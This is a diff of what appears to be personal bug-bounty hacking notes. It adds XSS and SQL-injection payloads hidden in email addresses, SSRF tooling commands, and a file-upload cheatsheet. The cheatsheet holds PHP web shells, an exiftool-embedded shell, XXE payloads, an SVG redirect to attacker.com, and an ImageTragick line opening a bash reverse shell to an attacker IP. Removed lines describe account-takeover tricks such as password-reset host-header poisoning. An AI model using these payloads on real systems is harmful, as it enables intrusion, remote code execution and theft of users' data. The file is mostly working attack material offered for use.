+27. in change password try to delete current password
+
      
      
 
@@ -1479,6 +2089,11 @@ beating the lenght limit  example
   test+(<script>alert(document.domain)</script>)@gmail.com
 just try this payload:
 test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+
+
+test+(<script>alert(0)</script>)@example.com
+test@example(<script>alert(0)</script>).com
+"<script>alert(0)</script>"@example.com
   
       
       
@@ -1552,6 +2167,8 @@ Tool: https://github.com/dpnishant/ra2-dom-xss-scanner
 
 www.gap.com/email?message=<script>alert("hi")</script>
 
+
+       go install github.com/KathanP19/Gxss@latest
      
      Tips to find DOM XSS: ⚡️🔥
  never use source while testing for dom xss
@@ -2090,7 +2707,25 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
 
 
 
-    SSRF
+    SSRF         SSRF        SSRF      SSRF      SSRF
+        tools
+    # https://github.com/tarunkant/Gopherus
+gopherus --exploit [PLATFORM]
+# https://github.com/daeken/SSRFTest
+# https://github.com/jmdx/TLS-poison/
+# https://github.com/m4ll0k/Bug-Bounty-Toolz
+# https://github.com/cujanovic/SSRF-Testing
+# https://github.com/bcoles/ssrf_proxy
+
+gau domain.com | python3 ssrf.py collab.listener.com
+
+# https://github.com/micha3lb3n/SSRFire
+./ssrfire.sh -d domain.com -s yourserver.com -f /path/to/copied_raw_urls.txt
+
+# SSRF Redirect Payload generator
+# https://tools.intigriti.io/redirector/
+
+
     map the application
         identify any request parameter that contains hostnames, ip addresses or full url
                  
@@ -2111,7 +2746,7 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
      use your own server that rediriect to an internal ip addresses (http redirection)
      
      
-     blind ssrf / out of band ssrf
+     BLIND SSRF / OUT OF BAND SSRF          BLIND SSRF / OUT OF BAND SSRF        BLIND SSRF / OUT OF BAND SSRF
      attemps to trigger an http request to an external system that you control and monitor the system for network interaction from the vulnerabble server 
        using burp collaborator
        
@@ -2122,6 +2757,16 @@ http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/pas
        site:https://somaiya.edu.in ext:php inurl:download.php
         https://example.com/viewimage/?url=file:///etc/passwd  ///
         https://example.com/viewimage/?url=http://169.254.169.254/latest/meta-data     // this is redirtling the file to aws/metadata
+        
+        
+        
+       One way of finding them is by inserting your burp collaborator domain into the referrer header also known as host header injection.
+    Snippet: 
+    
+            GET /HTTP 1.1
+    Host: site.tld
+    User Agent: Firefox
+    Referrer: https://your_collaborator_instance.com
         
         
         HOW TO CATCH A BLIND SSRF
@@ -2272,7 +2917,7 @@ header('Location: http://127.0.0.1:8080/status');
      then create a burpcollaburaor payload server and use qsreplace to replace all parameter value with burpcollaborator server payload and fuzz it with ffuf
   2  cat testblindssrf.txt | qsreplace “http://4v0er435p7gx4lx6432c7bdylprff4.burpcollaborator.net" >> ssrfuzz.txt   
      and then ffuf
-  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200
+  3  ffuf -c -w ssrfuzz.txt -u FUZZ -t 200 >
   
   
   Now  check whether if we get any http request hit on our burp collaborator server
@@ -2416,30 +3061,6 @@ Steps to Reproduce
 16 .By the way if you change to 25 port its leaking something about Postfix SMTP server.
 17.Also I was able to identify that your web app is using libcurl.
   
-
-
-   
-   TIPS 3
-I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
-
-Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
-
-Here's what to look for:
-
-1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
-2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓
-
-If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 
-
-Here's how it usually goes down:
-
-1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
-2️⃣ The victim receives an email with the receipt 📧
-3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
-4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜
-
-Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties 
-   
    
    tips 
    
@@ -2465,50 +3086,184 @@ Takeaways: Don't ignore workflows involving payments; you might discover workaro
       
       
       
-      ACCOUNT TAKEOVER
       
-   1) Check if weak password can be set
-       if yes, then check for brute-forcing
-    if no rate-limit 0r 429, too many requests response doesnst come within few minutes of bruteforcing, you can raise the report by mention
-    WEAK PASSWORD POLICY WITH NO RATE-LIMIT
+      
+      FILE UPLOAD CHEATSHEET           FILE UPLOAD CHEATSHEET          FILE UPLOAD CHEATSHEET     
+Where to find
+In upload file feature, for example upload photo profile feature
+How to exploit
+read also this pdf it conayin a many of ideas
+1-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/File-Upload.pdf
+by 0xAwali
+2-https://github.com/Az0x7/vulnerability-Checklist/blob/main/File%20Upload/Slides(1).pdf by ebrahim
+hegazy
+1. Change the Content-Type value
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+Change the Content-Type
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/jpeg
+2. Try to change the extension when send the request, for example in here you cant upload file with ext
+php but you can upload jpg file
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php.jpg"
+Content-Type: application/x-php
+Change the request to this
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+
+
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: application/x-php
+3. Upload the payload, but start with GIF89a; and
+POST /images/upload/ HTTP/1.1
+Host: target.com
+...
+---------------------------829348923824
+Content-Disposition: form-data; name="uploaded"; filename="dapos.php"
+Content-Type: image/gif
+GIF89a; <?php system("id") ?>
+And dont forget to change the content-type to image/gif
+4. Bypass content length validation, it can be bypassed using small payload
+(<?=`$_GET[x]`?>)
+5. Using null byte in filename
+file.php%00.gif
+6. Using double extensions for the uploaded file
+file.jpg.php
+7. Uploading an unpopular php extensions (php4,php5,php6,phtml)
+file.php5
+8. Try to randomly capitalizes the file extension
+file.pHP5
+9. Mix the tips!
+Upload Function
+Extensions Impact
+ASP , ASPX , PHP5 , PHP , PHP3 : Webshell, RCE
+SVG : Stored XSS, SSRF, XXE
+GIF : Stored XSS, SSRF
+CSV : CSV injection
+XML : XXE
+AVI : LFI, SSRF
+HTML , JS : HTML injection, XSS, Open redirect
+PNG , JPEG : Pixel flood attack (DoS)
+
+ZIP : RCE via LFI, DoS
+PDF , PPTX : SSRF, BLIND XXE
+Blacklisting Bypass
+PHP → .phtm , phtml , .phps , .pht , .php2 , .php3 , .php4 , .php5 , .shtml , .phar ,
+.pgif , .inc
+ASP → asp , .aspx , .cer , .asa
+Jsp → .jsp , .jspx , .jsw , .jsv , .jspf
+Coldfusion → .cfm , .cfml , .cfc , .dbm
+Using random capitalization → .pHp , .pHP5 , .PhAr
+Whitelisting Bypass
+file.jpg.php
+file.php.jpg
+file.php.blah123jpg
+file.php%00.jpg
+file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg
+and change the D (44) in hex to 00.
+file.php%00
+file.php%20
+file.php%0d%0a.jpg
+file.php.....
+file.php/
+file.php.\
+file.php#.png
+file.
+.html
+Vulnerabilities
+[ ] Directory Traversal
+Set filename ../../etc/passwd/logo.png
+Set filename ../../../logo.png as it might changed the website logo.
+[ ] SQL Injection
+Set filename 'sleep(10).jpg .
+Set filename sleep(10)-- -.jpg .
+[ ] Command Injection
+Set filename ; sleep 10;
+[ ] SSRF
+Abusing the "Upload from URL", if this image is going to be saved in some public site,
+you could also indicate a URL from IPlogger and steal information of every visitor.
+SSRF Through .svg file.
+
+<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.o
+[ ] ImageTragic
+push graphic-context
+viewbox 0 0 640 480
+fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0
+pop graphic-context
+[ ] XXE
+Upload using .svg file
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
+<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="htt
+<text font-size="40" x="0" y="16">&xxe;</text>
+</svg>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" w
+<image xlink:href="expect://ls"></image>
+</svg>
+Using excel file
+[ ] XSS
+Set file name filename="svg onload=alert(document.domain)>" ,
+filename="58832_300x300.jpg<svg onload=confirm()>"
+Upload using .gif file
+GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;
+Upload using .svg file
+<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DT
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb
+<script type="text/javascript">
+alert("HolyBugx XSS");
+</script>
+</svg>
+[ ] Open Redirect
+a. Upload using .svg file
+      <code>
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<svg
+onload="window.location='https://attacker.com'"
+xmlns="http://www.w3.org/2000/svg">
+<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0
+</svg>
+</code>
+Content-ish Bypass
+[ ] Content-type validation
+Upload file.php and change the Content-type: application/x-php or Content-Type
+: application/octet-stream to Content-type: image/png or Content-type: image/gif
+or Content-type: image/jpg .
+[ ] Content-Length validation
+Small PHP Shell
+(<?=`$_GET[x]`?>)
+[ ] Content Bypass Shell
+If they check the Content. Add the text "GIF89a;" before you shell-code. ( Contenttype: image/gif )
+GIF89a; <?php system($_GET['cmd']); ?>
+Misc
+[ ] Uploading file.js & file.config (web.config)
+[ ] Pixel flood attack using image
+[ ] DoS with a large values name: 1234...99.png
+[ ] Zip Slip
+If a site accepts .zip file, upload .php and compress it into .zip and upload it.
+Now visit, site.com/path?page=zip://path/file.zip%23rce.php
+[ ] Image Shell
+Exiftool is a great tool to view and manipulate exif-data. Then I will to rename the file
+mv pic.jpg pic.php.jpg
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' pic.jpg
+      
     
-   2) TRY TO SEND TOKEN IN RESET PASSSWORD
-     check on reset password
-     enter your mail id
-     intercept the request
-     add Token Parameter
-     {
-     email: "smaty@gmail.com",
-     token: "ggsgsgsfaagagagcz vzzvzzczcczczczcthisismytoken"                               any giberish
-     }
-     
-     check if the crafted token is sent or not , if yes report for account takeover
-    
-   
-    3)RESET PASSWORD POISONING
-    go to reset password function,
-    enter your email
-    intercet the request
-       change the Host header to some other Header such AS at Attacker.com,
-       Example:
-       Host: Taget.com  -> Host: attacker.com
-    Along with this, you can try to add new Headers   NOTE: dont change the header ( Host: Taget.com)
-        X-forword-Host: attacker.com,
-        Referrer:  https://attacker.com
-        
-    4) RESPONSE MANIPULATION
-      try with correct username and password
-        check the response status and body
-      
-      try wrong username and passwrod
-      change the reponse code and body with the response of the correct username and password
-      forward the request
-      
-    5) TRY CSRF ON MAJOR ENDPOINT
-     try Csrf on passowrd change
-     try csrf on email change
-     try csrf on phone no change 
-     try csrf on securlity change 
       
     
   TIP
@@ -2636,6 +3391,9 @@ cat urls.txt | qsreplace "?admin=true" | gau | phpgcc | anew | kxss | awk  -v  -
     
  
  SQL INJECTION        SQL INJECTION          SQL INJECTION
+ for email
+ "' OR 1=1 -- '"@example.com
+"mail'); DROP TABLE users;--"@example.com
  
  waybackurls http://testphp.vulnweb.com | gf sqli | tee -a sqli.txt ; wait ; sqlmap -m sqli.txt --batch --random-agent --level 1
  
@@ -3383,142 +4141,3 @@ xss%27;eval.call`${%27alert\x28window.origin\x29%27}`;//
     COMMAND THAT (TO BE EXECUTED ONCE A MONTH -MORE OR LESS
     
     today=$(date '+%Y-%m-%d'); cat subdomains.txt | httpx -follow-redirects -json -silent | tee active_subdomains_$today.json | jq -r '[.url,.content_length,.title,.host,.status_code] | @csv' | tee urls_modified_raw_$today.csv | anew -d urls_modified_raw_old.csv | cut -d',' -f1 | sed 's/"//g' | ./program active_subdomains_clean_$today.csv active_subdomains_clean_old.csv | tee urls_modified_clean_$today.txt | nuclei -silent -exclude-severity info,low | tee nuclei_urls_modified_$today.txt | notify; cp urls_modified_raw_{$today,old}.csv
-
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-
-
-
-
-
-    
-    
-  
-   
-  
-   
-   
-   
-   
-   
-   
-   
-   
-   
-   
-
-   
-   
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
-
- 
- 
- 
- 
- 
- 
- 
- 
-
-
-
-
-
- 
- 
- 
- 
-
-
-
-
-
-
